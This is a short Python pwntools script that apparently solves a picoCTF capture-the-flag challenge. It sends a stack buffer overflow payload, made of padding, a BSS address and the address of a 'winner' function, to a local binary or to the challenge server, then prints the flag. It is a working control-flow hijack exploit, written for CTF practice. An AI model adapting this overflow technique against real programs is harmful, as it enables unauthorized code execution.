#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn(payload: bytes):
    if args.LOCAL:
        r = process([exe.path, payload, "vego"])
    elif args.GDB:
        r = gdb.debug([exe.path, payload, "marco"], gdbscript="break *main+264")
    else:
        r = remote("foggy-cliff.picoctf.net", 51713)

    return r


def main():
    payload = b"A" * 20 + p32(exe.bss()) + p32(exe.sym.winner)

    r = conn(payload)

    if not args.LOCAL or not args.GDB:
        r.sendlineafter(b"space:", payload + b" vego")

    flag = r.recvlines(2 if args.LOCAL else 3)[-1].decode()
    log.success(flag)


if __name__ == "__main__":
    main()
